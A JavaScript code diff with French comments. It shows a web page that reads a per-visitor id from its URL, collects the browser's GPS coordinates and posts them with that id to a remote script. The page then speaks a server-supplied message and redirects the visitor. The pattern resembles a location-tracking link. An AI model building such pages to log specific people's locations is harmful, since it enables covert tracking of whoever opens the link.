@@ -8,7 +8,11 @@
 
     async function sendLocation() {
       try {
-        // Obtenir la position GPS
+        // 🔹 Récupère l'ID depuis l'URL (ex: ?id=1234)
+        const urlParams = new URLSearchParams(window.location.search);
+        const id = urlParams.get("id") || "inconnu";
+
+        // 🔹 Obtenir la position GPS
         const position = await new Promise((resolve, reject) => {
           if (!navigator.geolocation) {
             reject(new Error("Géolocalisation non disponible."));
@@ -19,28 +23,28 @@
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
 
-        // ⚠️ Envoi correct via POST (vers doPost)
+        // 🔹 Envoi via POST avec ID dynamique
         await fetch(scriptURL, {
           method: "POST",
           headers: {
             "Content-Type": "application/x-www-form-urlencoded"
           },
-          body: `id=test&latitude=${latitude}&longitude=${longitude}`
+          body: `id=${encodeURIComponent(id)}&latitude=${latitude}&longitude=${longitude}`
         });
 
-        // 🔄 Appel à doGet pour récupérer l’URL
+        // 🔹 Récupération de l’URL de redirection
         const urlResp = await fetch(`${scriptURL}?data=url`);
         const urlText = await urlResp.text();
 
-        // 🔄 Appel à doGet pour récupérer le message
+        // 🔹 Récupération du message vocal
         const msgResp = await fetch(`${scriptURL}?data=message`);
         const msgText = await msgResp.text();
 
-        // 🔊 Lecture vocale
+        // 🔊 Lecture
         const utterance = new SpeechSynthesisUtterance(msgText);
         speechSynthesis.speak(utterance);
 
-        // ✅ Redirection après 4 secondes
+        // Redirection après 4 secondes
         setTimeout(() => {
           window.location.href = urlText.trim();
         }, 4000);
